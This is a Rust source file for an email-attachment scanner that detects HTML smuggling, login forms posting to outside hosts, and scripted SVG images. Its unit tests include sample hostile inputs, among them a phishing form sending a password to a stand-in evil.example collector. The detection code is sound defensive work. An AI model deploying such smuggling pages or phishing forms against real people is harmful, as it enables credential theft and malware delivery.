//! What an HTML or SVG attachment carries: a file assembled in the
//! browser from an encoded blob (smuggling), a form that posts away, a
//! script in a picture.

use super::{Found, capped, contains_ci};
use crate::{Attachment, Limits};

fn ends_with_any(name: &str, exts: &[&str]) -> bool {
    let n = name.trim().to_ascii_lowercase();
    exts.iter().any(|e| n.ends_with(e))
}

fn is_html(a: &Attachment<'_>) -> bool {
    ends_with_any(a.name, &[".htm", ".html", ".shtml", ".xhtml"]) || a.declared_type == "text/html"
}

fn is_svg(a: &Attachment<'_>) -> bool {
    ends_with_any(a.name, &[".svg"]) || a.declared_type == "image/svg+xml"
}

/// The longest run of base64 characters.
fn longest_base64(b: &[u8]) -> usize {
    let mut best = 0;
    let mut run = 0;
    for &c in b {
        match c.is_ascii_alphanumeric() || c == b'+' || c == b'/' || c == b'=' {
            true => run += 1,
            false => {
                best = best.max(run);
                run = 0;
            }
        }
    }
    best.max(run)
}

const WRITERS: [&[u8]; 5] = [
    b"atob(",
    b"new blob(",
    b"msSaveOrOpenBlob",
    b"createObjectURL",
    b"download=",
];

/// The longest encoded run in an HTML or SVG part and the code in it that
/// writes a blob out as a file: `(run, writer, truncated)`. The rules
/// decide what length counts.
pub(crate) fn smuggling_parts(a: &Attachment<'_>, p: &Limits) -> (usize, Option<String>, bool) {
    if !is_html(a) && !is_svg(a) {
        return (0, None, false);
    }
    let (b, truncated) = capped(a, p);
    let writer = WRITERS
        .iter()
        .find(|w| contains_ci(b, w))
        .map(|w| String::from_utf8_lossy(w).to_string());
    (longest_base64(b), writer, truncated)
}

/// A form whose action is a web address: a login page sent as a file.
pub(crate) fn form(a: &Attachment<'_>, p: &Limits) -> Option<Found> {
    if !is_html(a) {
        return None;
    }
    let (b, truncated) = capped(a, p);
    let lower = String::from_utf8_lossy(b).to_ascii_lowercase();
    let mut from = 0;
    while let Some(at) = lower[from..].find("<form") {
        let tag_end = lower[from + at..]
            .find('>')
            .map_or(lower.len(), |e| from + at + e);
        let tag = &lower[from + at..tag_end];
        if let Some(act) = tag.find("action=") {
            let value = tag[act + 7..].trim_start_matches(['"', '\'', ' ']);
            if value.starts_with("http://")
                || value.starts_with("https://")
                || value.starts_with("//")
            {
                let host: String = value
                    .chars()
                    .take_while(|c| !matches!(c, '"' | '\'' | ' ' | '>'))
                    .collect();
                return Some(Found {
                    what: format!("a form posting to {host} in {:?}", a.name),
                    truncated,
                });
            }
        }
        from = tag_end;
    }
    None
}

/// An SVG that runs script.
pub(crate) fn svg_script(a: &Attachment<'_>, p: &Limits) -> Option<Found> {
    if !is_svg(a) {
        return None;
    }
    let (b, truncated) = capped(a, p);
    let marker = [
        b"<script".as_slice(),
        b"javascript:",
        b" onload=",
        b"<foreignobject",
    ]
    .into_iter()
    .find(|m| contains_ci(b, m))?;
    Some(Found {
        what: format!("{} in {:?}", String::from_utf8_lossy(marker).trim(), a.name),
        truncated,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn att<'a>(name: &'a str, bytes: &'a [u8]) -> Attachment<'a> {
        Attachment {
            name,
            declared_type: "",
            bytes,
        }
    }

    #[test]
    fn a_blob_and_its_writer() {
        let p = Limits::default();
        let blob = "QUJD".repeat(50);
        let page = format!(
            "<script>var b=atob('{blob}');var u=URL.createObjectURL(new Blob([b]))</script>"
        );
        let (run, writer, _) = smuggling_parts(&att("invoice.html", page.as_bytes()), &p);
        assert_eq!(run, 200);
        assert_eq!(writer.as_deref(), Some("atob("));
        let picture = format!("<img src=\"data:image/png;base64,{blob}\">");
        assert_eq!(
            smuggling_parts(&att("card.html", picture.as_bytes()), &p).1,
            None
        );
        assert_eq!(
            smuggling_parts(&att("a.txt", page.as_bytes()), &p),
            (0, None, false)
        );
    }

    #[test]
    fn a_form_that_posts_away() {
        let p = Limits::default();
        let page = b"<html><FORM method=post ACTION=\"https://evil.example/collect\"><input name=pw></form>";
        assert!(
            form(&att("login.htm", page), &p)
                .unwrap()
                .what
                .contains("evil.example")
        );
        assert!(form(&att("a.html", b"<form action=\"/local\"></form>"), &p).is_none());
        assert!(form(&att("a.html", b"<form><input></form>"), &p).is_none());
    }

    #[test]
    fn a_picture_that_runs_script() {
        let p = Limits::default();
        assert!(
            svg_script(
                &att("logo.svg", b"<svg><script>fetch('//x')</script></svg>"),
                &p
            )
            .is_some()
        );
        assert!(svg_script(&att("logo.svg", b"<svg><circle r=\"4\"/></svg>"), &p).is_none());
    }
}
